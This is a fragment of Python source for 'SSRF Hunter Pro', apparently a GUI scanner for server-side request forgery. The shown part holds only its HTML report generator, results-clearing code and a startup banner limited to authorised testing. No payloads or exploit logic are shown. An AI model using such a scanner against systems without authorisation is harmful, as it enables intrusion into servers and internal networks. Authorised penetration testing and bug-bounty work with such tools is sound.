        body { background: #0a0a0a; color: #00ff41; font-family: Consolas, monospace; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        h1 { color: #39ff14; text-align: center; }
        .result { background: #1a1a1a; padding: 15px; margin: 10px 0; border-left: 3px solid #00ff41; }
        .vulnerable { border-left-color: #ff0040; }
        .label { color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ SSRF Hunter Pro - Scan Report ⚡</h1>
        <p>Generated: """ + datetime.now().isoformat() + """</p>
        <hr>
"""

        for result in self.scan_results:
            vuln_class = "vulnerable" if result['vulnerable'] else ""
            html += f"""
        <div class="result {vuln_class}">
            <p><span class="label">Payload:</span> {result['payload']}</p>
            <p><span class="label">Vulnerable:</span> {result['vulnerable']}</p>
        </div>
"""

        html += """
    </div>
</body>
</html>
"""
        return html

    def _clear_results(self):
        """Clear all results"""
        self.scan_results = []
        self.results_text.delete(1.0, tk.END)
        for label in self.summary_labels.values():
            label.config(text="0")

    def run(self):
        """Run the application"""
        self.root.mainloop()


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║           SSRF HUNTER PRO - Starting Application              ║
    ║                                                               ║
    ║   ⚠️  AUTHORIZED TESTING ONLY - USE RESPONSIBLY ⚠️            ║
    ║   For bug bounty and authorized penetration testing           ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    app = SSRFHunterGUI()
    app.run()
